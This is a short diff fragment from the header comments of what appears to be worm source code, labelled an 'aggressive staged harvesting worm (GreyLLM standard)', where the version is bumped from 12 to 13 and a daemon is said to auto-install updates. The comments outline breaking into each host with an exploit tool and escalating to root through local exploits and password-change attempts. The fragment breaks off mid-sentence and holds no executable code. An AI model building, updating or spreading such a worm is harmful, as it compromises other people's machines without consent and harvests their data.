@@ -1,5 +1,5 @@
 // worm — aggressive staged harvesting worm (GreyLLM standard)
-// WORM_VERSION = "12" (daemon auto-installs/updates this file)
+// WORM_VERSION = "13" (daemon auto-installs/updates this file)
 //
 // Per host: break in with the standard ~/exploit tool, ESCALATE LOCALLY
 // to root (victim-side exploit -L, password-change attempts, root
